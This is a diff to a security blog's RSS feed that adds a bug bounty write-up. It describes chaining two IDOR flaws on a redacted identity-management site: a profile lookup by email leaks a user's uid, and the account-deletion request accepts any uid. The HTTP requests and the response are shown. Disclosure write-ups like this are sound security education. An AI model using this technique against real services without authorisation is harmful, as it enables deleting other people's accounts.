@@ -6,8 +6,159 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 09 Sep 2021 15:19:36 +0530</lastBuildDate>
+        <lastBuildDate>Fri, 10 Sep 2021 09:37:47 +0530</lastBuildDate>
         <atom:link href="http://0xsudip.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Delete any account using IDOR</title>
+            <link>http://0xsudip.github.io/posts/delete-any-account-using-idor/</link>
+            <pubDate>Fri, 10 Sep 2021 09:37:47 +0530</pubDate>
+            
+            <guid>http://0xsudip.github.io/posts/delete-any-account-using-idor/</guid>
+            <description>Hello, amazing hackers my name is Sudip Roy and i am an InfoSec student and part-time Bug Hunter.This is my first writeup about a critical vulnerability which i found on a website(Vdp). Hope you guys will like it and learn something new from it.
+Lets get started, The website provides cloud-based consumer identity and access management (CIAM) solution. For testing purposes i signup using my account, select developer pro(extra features), created a app and looked for every features of the website, 1 hour later i decided to play with the delete account feature from the settings page.</description>
+            <content type="html"><![CDATA[<p>Hello, amazing hackers my name is Sudip Roy and i am an InfoSec student and part-time Bug Hunter.This is my first writeup about a critical vulnerability which i found on a website(Vdp). Hope you guys will like it and learn something new from it.</p>
+<p>Lets get started, The website provides cloud-based consumer identity and access management (CIAM) solution.
+For testing purposes i signup using my account, select developer pro(extra features), created a app and looked for every features of the website, 1 hour later i decided to play with the delete account feature from the settings page. I request for the delete account and checked the request in burpsuite and send the request to repeater and drop it.</p>
+<p>The request looked like this(1st IDOR):</p>
+<pre><code>DELETE /account/customer? HTTP/1.1
+Host: redacted-api.redacted.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 42
+X-Is-redacted--Sign: &lt;some-token&gt;
+X-Is-redacted--Token: &lt;some-token&gt;
+X-Is-redacted-Ajax: true
+Cache-Control: no-store,max-age=0
+Origin: https://dashboard.redacted.com
+Referer: https://dashboard.redacted.com/profile
+Te: trailers
+Connection: close
+
+{&quot;uid&quot;:&quot;4adddbea4e3646a0b951ce4822075707&quot;}
+</code></pre><p>Now, after looking the request, we can easily identify uid(user identification) parameter is used so the website maybe prone to idor.
+I made 2nd account and request for the delete account feature, the request was exactly same and uid is different. I copy the uid code of the 2nd account and replace uid code with first request&rsquo;s code. After sending the request the my 2nd account was successfully deleted.(1st IDOR)</p>
+<p>Here the impact is nothing because how will the attacker get&rsquo;s the victim&rsquo;s uid. So i needed to find the victim&rsquo;s uid.</p>
+<p>After spending some time with the website, i found that i can invite a team-member to my app which i created when signing up in the website. So i invited the user to my app and checked the requests made by website. While checking i found this interesting request:</p>
+<pre><code>GET /team/userprofile?email=nexas60891%40rebation.com&amp; HTTP/1.1
+Host: adminconsole-api.redacted.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Is-redacted--Sign: &lt;some-token&gt;
+X-Is-redacted--Token: &lt;some-token&gt;
+X-Is-redacted-Ajax: true
+Cache-Control: no-store,max-age=0
+Origin: https://dashboard.redacted.com
+Referer: https://dashboard.redacted.com/teams
+Te: trailers
+Connection: close
+
+</code></pre><p>I send the request to the repeater and send the request. The request showed some information related to the victim&rsquo;s email including uid code.
+Response:</p>
+<pre><code>HTTP / 1.1 200 OK
+Server: nginx
+Date: Fri, 10 Sep 2021 05: 11: 57 GMT
+Content - Type: application / json;
+charset = utf - 8
+Connection: close
+aca - request - id: 9 f2c40e0 - 11 f5 - 11e c - b525 - 9 f29fd8a2e9a
+Access - Control - Allow - Headers: Content - Type, Cache - Control, Authorization, Content - Length, X - Requested - With, X - Is - redacted - Ajax, X - Is - redacted--Token, X - Is - redacted--Sign
+Access - Control - Allow - Methods: GET, PUT, POST, DELETE, OPTIONS
+Access - Control - Allow - Origin: https: //dashboard.redacted.com
+  ETag: W / &quot;d8d-UnkAQfkFjrEDJEI34fj1dAMTHHw&quot;
+Strict - Transport - Security: max - age = 1234000;
+includeSubDomains
+Vary: Origin, Accept - Encoding
+X - Frame - Options: SAMEORIGIN
+X - Powered - By: PHP 5.2.0
+X - XSS - Protection: 1;
+mode = block
+X - Server: admin_root_primary
+Access - Control - Max - Age: 3600
+Content - Length: 3469
+
+{
+  &quot;Identities&quot;: null,
+  &quot;Password&quot;: &quot;**********&quot;,
+  &quot;LastPasswordChangeDate&quot;: null,
+  &quot;PasswordExpirationDate&quot;: &quot;2021-12-08T11:51:01.6230000Z&quot;,
+  &quot;LastPasswordChangeToken&quot;: null,
+  &quot;EmailVerified&quot;: true,
+  &quot;IsActive&quot;: true,
+  &quot;IsDeleted&quot;: false,
+  &quot;Uid&quot;: &quot;858fb2cafd0c454096322e30d059722a&quot;,
+  &quot;CustomFields&quot;: {
+    &quot;IsPrivacyPolicyAccepted&quot;: &quot;false&quot;,
+    &quot;gclid&quot;: &quot;&quot;,
+    &quot;utm_campaign&quot;: &quot;&quot;,
+    &quot;utm_medium&quot;: &quot;&quot;,
+    &quot;utm_source&quot;: &quot;&quot;,
+    &quot;cf_PlanType&quot;: &quot;{\&quot;rebation-roqagari\&quot;:\&quot;free\&quot;}&quot;,
+    &quot;roleInfo&quot;: &quot;{\&quot;role\&quot;:\&quot;Developer\&quot;,\&quot;lookingFor\&quot;:\&quot;for product research\&quot;}&quot;
+  },
+  &quot;IsEmailSubscribed&quot;: false,
+  &quot;UserName&quot;: null,
+  &quot;NoOfLogins&quot;: 2,
+  &quot;PhoneId&quot;: null,
+  &quot;PhoneIdVerified&quot;: false,
+  &quot;Roles&quot;: null,
+  &quot;ExternalUserLoginId&quot;: null,
+  &quot;RegistrationProvider&quot;: &quot;Email&quot;,
+  &quot;IsLoginLocked&quot;: false,
+  &quot;LoginLockedType&quot;: &quot;None&quot;,
+  &quot;LastLoginLocation&quot;: &quot;redacted, India&quot;,
+  &quot;RegistrationSource&quot;: &quot;https://accounts.redacted.com/auth.aspx?return_url=https://dashboard.redacted.com/login&amp;action=register&amp;source=email&quot;,
+  &quot;IsCustomUid&quot;: false,
+  &quot;UnverifiedEmail&quot;: null,
+  &quot;IsSecurePassword&quot;: null,
+  &quot;PrivacyPolicy&quot;: null,
+  &quot;ExternalIds&quot;: null,
+  &quot;IsRequiredFieldsFilledOnce&quot;: true,
+  &quot;ConsentProfile&quot;: null,
+  &quot;PIN&quot;: null,
+  &quot;RegistrationData&quot;: null,
+  &quot;ID&quot;: &quot;69877142c7644ef8a954a0a07f05cdca&quot;,
+  &quot;Provider&quot;: &quot;Email&quot;,
+  &quot;Prefix&quot;: null,
+  &quot;FirstName&quot;: &quot;Victim&quot;,
+  &quot;MiddleName&quot;: null,
+  &quot;LastName&quot;: null,
+  &quot;Suffix&quot;: null,
+  &quot;FullName&quot;: &quot;Victim&quot;,
+  &quot;Email&quot;: [{
+    &quot;Type&quot;: &quot;Primary&quot;,
+    &quot;Value&quot;: &quot;nexas60891@rebation.com&quot;
+  }],
+  &quot;Country&quot;: null,
+  &quot;Positions&quot;: null,
+  &quot;Educations&quot;: null,
+  &quot;PhoneNumbers&quot;: null,
+  &quot;IMAccounts&quot;: null,
+  &quot;Addresses&quot;: null,
+  &quot;MainAddress&quot;: null,
+  &quot;Created&quot;: null,
+  &quot;CreatedDate&quot;: &quot;null&quot;,
+  &quot;ModifiedDate&quot;: &quot;null&quot;,
+}
+</code></pre><p>I copy the uid from this response and replace with uid code in the 1st acccount&rsquo;s request -&gt; Send the request -&gt; The victim&rsquo;s account was permanently deleted.</p>
+<ul>
+<li>Another thing i noticed that <a href="https://adminconsole-api.redacted.com/team/userprofile?email=">https://adminconsole-api.redacted.com/team/userprofile?email=</a><!-- raw HTML omitted -->&amp; HTTP/1.1
+This email parameter takes any email and return it&rsquo;s uid so i can delete any dev. or admin&rsquo;s account easily.</li>
+</ul>
+<p>Takeaways:</p>
+<ol>
+<li>Always checks for idor if any uid/guid or number present in the request and check every http request using burp.</li>
+<li>One IDOR tip -&gt; <a href="https://twitter.com/intigriti/status/1217794181982302208/photo/1">https://twitter.com/intigriti/status/1217794181982302208/photo/1</a></li>
+</ol>
+<p>Thankyou, for reading :v:
+You can follow me, I retweet and tweet related to Bug Bounty and InfoSec -&gt; <a href="https://twitter.com/0xsudip">https://twitter.com/0xsudip</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>Mypost</title>
